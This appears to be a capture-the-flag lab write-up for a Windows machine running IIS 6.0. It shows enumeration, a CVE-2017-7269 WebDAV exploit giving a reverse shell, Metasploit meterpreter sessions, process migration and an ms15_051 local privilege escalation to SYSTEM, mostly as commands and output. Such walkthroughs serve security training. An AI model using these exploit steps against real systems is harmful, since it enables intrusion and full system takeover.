## Granny

### Lab Details 

- Difficulty: Easy
- Type: Windows

#### Enumeration
- nmap
```bash
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Tue, 05 Aug 2025 06:12:11 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
```
- investigate port 80
	- enumerate directories didn't find anything useful
- searched for `Microsoft IIS httpd 6.0` and found that it might be vulnerable to remote buffer overflow in WebDAV service

#### Initial Foothold 
- found POC: https://github.com/VanishedPeople/CVE-2017-7269
- was able to gain a RCE to remote however unable to proceed further
```
$ python3 CVE-2017-7269.py 10.10.10.15 80 10.10.16.22 4444

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.10.15] 1042
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
- moved to `msfconsole`
```
msf6 > search cve-2017-7269

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute fo
                                             rce
   MINPATHLENGTH  3                yes       Start of physical path brute
                                             force
   Proxies                         no        A proxy chain of format type:
                                             host:port[,type:host:port][..
                                             .]
   RHOSTS                          yes       The target host(s), see https
                                             ://docs.metasploit.com/docs/u
                                             sing-metasploit/basics/using-
                                             metasploit.html
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoin
                                             g connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh,
                                         thread, process, none)
   LHOST     192.168.44.128   yes       The listen address (an interface m
                                        ay be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86



View the full module info with the info, or info -d command.
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
[*] Started reverse TCP handler on 10.10.16.22:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (177734 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.16.22:4444 -> 10.10.10.15:1030) at 2025-08-05 00:24:43 -0700

```
#### Lateral Movement (If any)

#### Privilege Escalation
- once we have the reverse shell we can use `local_exploit_suggester` 
```
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.15 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.10.10.15 - 203 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.15 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                          Yes     
<snip>
```
- we will need to migrate to a stable process
```
msf6 exploit(windows/local/ppr_flatten_rec) > sessions 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 584   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 772   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1064  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1312  392   VGAuthService.exe
 1380  392   vmtoolsd.exe
 1484  392   svchost.exe
 1724  392   dllhost.exe
 1768  392   svchost.exe
 1924  1064  cidaemon.exe
 1936  392   alg.exe
 1964  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2168  1484  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2236  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2300  1064  cidaemon.exe
 2332  1064  cidaemon.exe
 2556  584   wmiprvse.exe
 2972  2168  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3248  344   logon.scr

meterpreter > migrate 2236
[*] Migrating from 2972 to 2236...
[*] Migration completed successfully.
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/local/ppr_flatten_rec) > use ms15_051_client_copy_image

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  exploit/windows/local/ms15_051_client_copy_image  2015-05-12       normal  Yes    Windows ClientCopyImage Win32k Exploit
   1    \_ target: Windows x86                          .                .       .      .
   2    \_ target: Windows x64                          .                .       .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/local/ms15_051_client_copy_image
After interacting with a module you can manually set a TARGET with set TARGET 'Windows x64'

[*] Using exploit/windows/local/ms15_051_client_copy_image
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms15_051_client_copy_image) > options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.22      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms15_051_client_copy_image) > run
[*] Started reverse TCP handler on 10.10.16.22:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 2968 launched.
[*] Reflectively injecting the DLL into 2968...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.16.22:4444 -> 10.10.10.15:1033) at 2025-08-05 00:34:02 -0700

meterpreter > shell
Process 1712 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```
#### Resources

#### Lesson Learned
